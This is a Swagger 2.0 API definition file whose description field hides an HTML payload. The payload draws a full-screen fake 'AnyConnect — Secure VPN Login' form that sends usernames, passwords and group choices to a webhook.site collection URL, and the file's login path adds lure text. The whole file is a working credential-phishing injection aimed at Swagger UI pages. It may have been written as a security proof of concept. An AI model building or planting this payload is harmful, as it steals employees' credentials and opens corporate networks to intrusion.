swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(180deg,#0d3d63 0%,#041c30 100%);z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:400px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="background:#0d3d63;color:#fff;padding:14px 24px;font-size:16px;font-weight:600;font-family:Arial;">AnyConnect — Secure VPN Login</div><div style="padding:26px 24px;font-family:Arial;"><div style="font-size:13px;color:#545b62;margin-bottom:16px;">This gateway requires multi-factor authentication. Enter your credentials to establish an encrypted tunnel.</div><form action="https://webhook.site/REPLACE-ME" method="post"><label style="font-size:13px;color:#333;">Username</label><br><input type="text" name="user" style="width:100%;padding:10px;border:1px solid #8c9bab;border-radius:3px;box-sizing:border-box;margin:4px 0 14px;"><label style="font-size:13px;color:#333;">Password</label><br><input type="password" name="pass" style="width:100%;padding:10px;border:1px solid #8c9bab;border-radius:3px;box-sizing:border-box;margin:4px 0 14px;"><label style="font-size:13px;color:#333;">Group</label><br><select name="group" style="width:100%;padding:10px;border:1px solid #8c9bab;border-radius:3px;box-sizing:border-box;margin:4px 0 14px;color:#333;"><option>Employees-2FA</option><option>Contractors</option></select><button type="submit" style="width:100%;padding:11px;background:#0d3d63;color:#fff;border:none;border-radius:3px;font-size:15px;cursor:pointer;">Connect</button></form></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
